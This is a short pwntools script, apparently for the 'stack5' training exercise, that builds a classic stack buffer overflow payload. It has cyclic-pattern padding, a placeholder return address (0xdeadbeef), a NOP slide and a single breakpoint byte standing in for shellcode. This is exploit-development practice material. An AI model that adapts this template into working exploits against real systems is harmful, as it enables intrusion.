from pwn import *
#proc = process('./stack5')
#proc.recvuntil('>')
padding = cyclic(cyclic_find('taaa'))
eip = p32(0xdeadbeef)
nop_slide = "\x90"*400
shellcode = "\xCC"
payload = padding + eip + nop_slide + shellcode
print payload